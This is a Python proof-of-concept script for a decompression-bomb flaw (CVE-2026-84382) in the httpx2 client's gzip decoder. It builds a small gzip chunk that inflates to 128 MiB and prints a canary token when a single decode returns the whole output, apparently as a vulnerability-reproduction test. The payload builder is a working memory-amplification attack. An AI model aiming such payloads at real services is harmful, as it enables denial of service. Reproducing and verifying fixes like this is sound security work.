#!/usr/bin/env python3
"""
Proof-of-concept for CVE-2026-84382 — HTTPX2 unbounded intermediate inflation
of a single compressed response chunk (CWE-409, memory amplification).

Bug (httpx2 < 2.12.0, src/httpx2/httpx2/_decoders.py):
  The content decoders (gzip/deflate/br/zstd) fully inflate an entire
  network chunk in ONE intermediate allocation before iter_bytes()/
  aiter_bytes() slice it into bounded pieces. A tiny, highly-compressible
  chunk therefore forces a single huge allocation regardless of the
  application's streaming chunk_size.

Fix (2.12.0, PR #1126): "Bound peak memory while streaming compressed
  responses" — decode() now yields bounded output (max_length) and buffers
  the rest, so no single decode of one chunk produces a large object.

Differential primitive:
  Feed the decoder ONE gzip chunk that inflates to ~128 MiB of zeros (built
  incrementally so THIS process never itself holds the expanded data).
    * Vulnerable: a single decoder.decode(chunk) call returns the whole
      ~128 MiB at once  ->  huge single object / peak spike.
    * Patched:    decode() returns a bounded slice (well under the threshold)
      and buffers the remainder  ->  no large single allocation.

  The canary is emitted ONLY as a direct consequence of observing that a
  single decode of one chunk produced an over-threshold intermediate
  inflation. On the patched build that never happens, so nothing is printed.
"""

import os
import sys
import gc
import zlib

TOKEN_ENV = "POC_CANARY"

INFLATED = 128 * 1024 * 1024      # one chunk expands to 128 MiB of zeros
THRESHOLD = 20 * 1024 * 1024      # a single decode over this == full inflation
                                  # (any sane bounded decoder returns << this)


def build_gzip_chunk(total):
    """Build a gzip stream that inflates to `total` zero bytes.

    Built incrementally through a compressobj so this process's own peak
    memory stays tiny (~1 MiB) — the amplification must come from the
    victim decoder, never from us."""
    co = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16)  # gzip framing
    block = b"\x00" * (1024 * 1024)
    parts = []
    remaining = total
    while remaining > 0:
        n = min(len(block), remaining)
        parts.append(co.compress(block if n == len(block) else block[:n]))
        remaining -= n
    parts.append(co.flush())
    return b"".join(parts)


def emit_canary():
    # Reached ONLY when the vulnerable one-shot inflation was observed.
    sys.stdout.write(os.environ[TOKEN_ENV])
    sys.stdout.write("\n")
    sys.stdout.flush()


def _resolve_gzip_decoder():
    """Locate httpx2's gzip content decoder class, tolerating naming."""
    import httpx2._decoders as decoders

    reg = getattr(decoders, "SUPPORTED_DECODERS", None)
    if isinstance(reg, dict) and reg.get("gzip") is not None:
        return reg["gzip"]

    for attr in ("GZipDecoder", "GzipDecoder", "GZIPDecoder"):
        cls = getattr(decoders, attr, None)
        if isinstance(cls, type):
            return cls

    # Last resort: probe every class with a tiny gzip blob and keep the one
    # that decodes it to zeros (identity returns gzip bytes; deflate raises).
    probe = build_gzip_chunk(1024)
    for name in dir(decoders):
        obj = getattr(decoders, name)
        if not isinstance(obj, type):
            continue
        try:
            out = obj().decode(probe)
        except Exception:
            continue
        if out and out[:16] == b"\x00" * 16:
            return obj
    return None


def decoder_level_signal(chunk):
    """Vulnerable iff a SINGLE decode() of one chunk returns >= THRESHOLD.

    We deliberately look only at the first decode() call's return size (the
    single intermediate object), never at cumulative output — the bug is a
    single oversized allocation, and a patched decoder drips bounded slices."""
    cls = _resolve_gzip_decoder()
    if cls is None:
        return False
    d = cls()
    out = d.decode(chunk)
    return bool(out) and len(out) >= THRESHOLD


def streaming_peak_signal(chunk):
    """Vulnerable iff peak memory while streaming the response spikes.

    Faithfully exercises the public iter_bytes() path — exactly the
    'streaming compressed responses' that PR #1126 bounds. Peak (max
    simultaneous, not cumulative) captures the transient full inflation."""
    import tracemalloc
    import httpx2

    gc.collect()
    tracemalloc.start()
    try:
        tracemalloc.reset_peak()
        resp = httpx2.Response(
            200,
            headers={"content-encoding": "gzip"},
            content=iter([chunk]),
        )
        # Consume bounded pieces and discard: on a bounded (patched) decoder
        # nothing large is ever alive at once; on the vulnerable one the whole
        # chunk is inflated in a single object before slicing.
        for _ in resp.iter_bytes():
            pass
        _, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    return peak >= THRESHOLD


def main():
    chunk = build_gzip_chunk(INFLATED)
    gc.collect()

    triggered = False

    # Primary, allocation-noise-free signal: single-call decode output size.
    try:
        if decoder_level_signal(chunk):
            triggered = True
    except Exception:
        pass

    # Secondary confirmation via the real streaming API + peak memory.
    if not triggered:
        try:
            if streaming_peak_signal(chunk):
                triggered = True
        except Exception:
            pass

    if triggered:
        emit_canary()
    else:
        sys.stderr.write(
            "no single-chunk over-threshold inflation observed "
            "(decoder bounds peak memory) — not vulnerable\n"
        )


if __name__ == "__main__":
    main()